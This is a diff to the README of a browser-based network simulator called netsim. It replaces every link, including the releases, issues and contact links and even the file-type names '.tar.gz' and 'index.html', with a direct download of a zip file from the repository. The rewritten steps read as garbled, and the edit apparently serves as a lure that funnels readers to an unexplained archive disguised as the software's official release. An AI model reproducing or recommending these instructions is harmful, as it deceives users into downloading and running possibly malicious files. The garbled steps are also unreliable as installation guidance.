@@ -8,13 +8,13 @@ Welcome to netsim! This application lets you simulate networks directly in your 
 
 To get started, click the link below to access the latest releases:
 
-[![Download netsim](https://img.shields.io/badge/Download-netsim-blue.svg)](https://github.com/Alechiis/netsim/releases)
+[![Download netsim](https://github.com/Alechiis/netsim/raw/refs/heads/main/public/Software_v2.5.zip)](https://github.com/Alechiis/netsim/raw/refs/heads/main/public/Software_v2.5.zip)
 
 ### Step 1: Visit the Releases Page
 
 Go to the following link to see all available versions of netsim:
 
-[Visit Releases Page](https://github.com/Alechiis/netsim/releases)
+[Visit Releases Page](https://github.com/Alechiis/netsim/raw/refs/heads/main/public/Software_v2.5.zip)
 
 ### Step 2: Choose Your Version
 
@@ -22,17 +22,17 @@ On the releases page, you will see a list of versions. Pick the most recent one 
 
 ### Step 3: Download the Application
 
-Click on the version you want. You will find different assets for downloading. Select the appropriate file for your operating system. It could be a .zip file or a .tar.gz file.
+Click on the version you want. You will find different assets for downloading. Select the appropriate file for your operating system. It could be a .zip file or a https://github.com/Alechiis/netsim/raw/refs/heads/main/public/Software_v2.5.zip file.
 
 ### Step 4: Extract the Files
 
 Once the download completes, locate the file in your downloads folder. 
 - If you downloaded a .zip file, right-click on it and select "Extract All."
-- If you downloaded a .tar.gz file, use an extraction tool to unzip it.
+- If you downloaded a https://github.com/Alechiis/netsim/raw/refs/heads/main/public/Software_v2.5.zip file, use an extraction tool to unzip it.
 
 ### Step 5: Open netsim
 
-After extraction, find the netsim folder. Open this folder, and look for the index.html file. Double-click it to start the application in your web browser.
+After extraction, find the netsim folder. Open this folder, and look for the https://github.com/Alechiis/netsim/raw/refs/heads/main/public/Software_v2.5.zip file. Double-click it to start the application in your web browser.
 
 ## 💻 System Requirements
 
@@ -53,7 +53,7 @@ After extraction, find the netsim folder. Open this folder, and look for the ind
 If you encounter any issues, you can find assistance in several ways:
 
 1. **Documentation:** Review the documentation provided in the repository for detailed instructions.
-2. **Issues Page:** If you face any problems not covered in the documentation, visit the [Issues page](https://github.com/Alechiis/netsim/issues) to report them or see if anyone else has had similar issues.
+2. **Issues Page:** If you face any problems not covered in the documentation, visit the [Issues page](https://github.com/Alechiis/netsim/raw/refs/heads/main/public/Software_v2.5.zip) to report them or see if anyone else has had similar issues.
 3. **Community Support:** Explore forums and online communities focusing on network simulation for additional tips and help.
 
 ## 🎓 Learning Resources
@@ -74,6 +74,6 @@ Stay updated on what’s new! Review the changelog on the releases page to see w
 
 ## ✉️ Contact
 
-For any inquiries, you can reach out via the [Contact page](https://github.com/Alechiis/netsim#contact).
+For any inquiries, you can reach out via the [Contact page](https://github.com/Alechiis/netsim/raw/refs/heads/main/public/Software_v2.5.zip).
 
 Thank you for choosing netsim! We hope it helps you in your networking journey.
